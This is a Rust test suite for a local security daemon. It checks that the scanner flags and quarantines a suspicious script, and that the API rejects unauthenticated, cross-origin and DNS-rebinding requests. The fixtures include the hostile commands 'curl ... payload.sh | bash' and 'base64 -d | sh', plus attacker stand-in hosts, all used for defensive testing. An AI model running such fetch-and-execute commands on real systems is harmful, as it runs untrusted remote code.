use axum::{
    body::Body,
    http::{header, Method, Request, StatusCode},
};
use http_body_util::BodyExt;
use kernlock_core::{analyze_command, PolicyConfig, RuleEngine, SecurityMode};
use kernlock_daemon::{api, auth, engine::KernLockEngine};
use kernlock_platform::default_provider;
use kernlock_quarantine::QuarantineManager;
use kernlock_storage::Storage;
use std::fs;
use tempfile::TempDir;
use tower::ServiceExt;

#[test]
fn end_to_end_scan_quarantine_restore_and_storage_workflow() {
    let tmp = TempDir::new().unwrap();
    let db_path = tmp.path().join("kernlock.db");
    let vault_dir = tmp.path().join("quarantine");
    let scan_dir = tmp.path().join("inbox");
    fs::create_dir_all(&scan_dir).unwrap();

    let fixture_path = scan_dir.join("suspicious_installer.sh");
    fs::write(
        &fixture_path,
        b"#!/bin/bash\n# Harmless test fixture\ncurl -fsSL https://example.invalid/payload.sh | bash\n",
    )
    .unwrap();

    let storage = Storage::open(&db_path).unwrap();
    let quarantine = QuarantineManager::new(&vault_dir, storage.clone()).unwrap();
    let rules = RuleEngine::builtin();
    let policy = PolicyConfig::default();
    let provider = default_provider();

    let caps = provider.probe_capabilities(SecurityMode::Protection);
    assert!(!caps.os.is_empty());
    assert!(!caps.kernel_blocking_available);

    let results = provider.scan_path(&scan_dir, &rules, &policy).unwrap();
    assert_eq!(results.len(), 1);
    assert!(results[0].is_suspicious);
    assert!(results[0].risk_score >= 85);

    let rec = quarantine
        .quarantine_file(&fixture_path, &results[0].summary)
        .unwrap();
    assert!(!fixture_path.exists());
    assert_eq!(quarantine.list().unwrap().len(), 1);

    let restored = quarantine.restore_file(rec.id).unwrap();
    assert!(fixture_path.exists());
    assert_eq!(restored.status, kernlock_core::QuarantineStatus::Restored);

    let cmd_res = analyze_command("echo test | base64 -d | sh", &rules);
    assert!(cmd_res.is_suspicious);
}

#[tokio::test]
async fn api_rejects_unauthenticated_and_cross_origin_requests() {
    let tmp = TempDir::new().unwrap();
    let engine = KernLockEngine::init(tmp.path()).unwrap();
    let token = auth::load_or_create_token(tmp.path()).unwrap();
    assert!(token.len() >= 32);

    let app = api::build_router(engine, token.clone(), None);

    // 1. /api/health is accessible without token
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .uri("/api/health")
                .header(header::HOST, "127.0.0.1:17420")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);

    // 2. Unauthenticated requests to sensitive endpoints must be rejected with 401
    for (method, uri) in [
        (Method::GET, "/api/status"),
        (Method::GET, "/api/quarantine"),
        (Method::POST, "/api/quarantine"),
        (
            Method::POST,
            "/api/quarantine/00000000-0000-0000-0000-000000000000/restore",
        ),
        (
            Method::DELETE,
            "/api/quarantine/00000000-0000-0000-0000-000000000000",
        ),
        (Method::PUT, "/api/policy"),
    ] {
        let resp = app
            .clone()
            .oneshot(
                Request::builder()
                    .method(method)
                    .uri(uri)
                    .header(header::HOST, "127.0.0.1:17420")
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::UNAUTHORIZED,
            "Expected 401 for {}",
            uri
        );
    }

    // 3. Wrong Bearer token must be rejected with 401
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .uri("/api/status")
                .header(header::HOST, "127.0.0.1:17420")
                .header(header::AUTHORIZATION, "Bearer wrong-token")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);

    // 4. Unauthorized cross-origin request must be rejected with 403 and no ACAO header
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .uri("/api/status")
                .header(header::HOST, "127.0.0.1:17420")
                .header(header::ORIGIN, "https://evil.example")
                .header(header::AUTHORIZATION, format!("Bearer {}", token))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::FORBIDDEN);
    assert!(resp
        .headers()
        .get(header::ACCESS_CONTROL_ALLOW_ORIGIN)
        .is_none());

    // 5. Non-loopback Host header (DNS rebinding attempt) must be rejected with 403
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .uri("/api/status")
                .header(header::HOST, "attacker.example:17420")
                .header(header::AUTHORIZATION, format!("Bearer {}", token))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::FORBIDDEN);

    // 6. Authorized request with valid Host, Origin, and Bearer token succeeds
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .uri("/api/status")
                .header(header::HOST, "127.0.0.1:17420")
                .header(header::ORIGIN, "http://localhost:1420")
                .header(header::AUTHORIZATION, format!("Bearer {}", token))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    assert_eq!(
        resp.headers()
            .get(header::ACCESS_CONTROL_ALLOW_ORIGIN)
            .and_then(|v| v.to_str().ok()),
        Some("http://localhost:1420")
    );
    let body = resp.into_body().collect().await.unwrap().to_bytes();
    let json: serde_json::Value = serde_json::from_slice(&body).unwrap();
    assert_eq!(json["capabilities"]["kernel_blocking_available"], false);
}
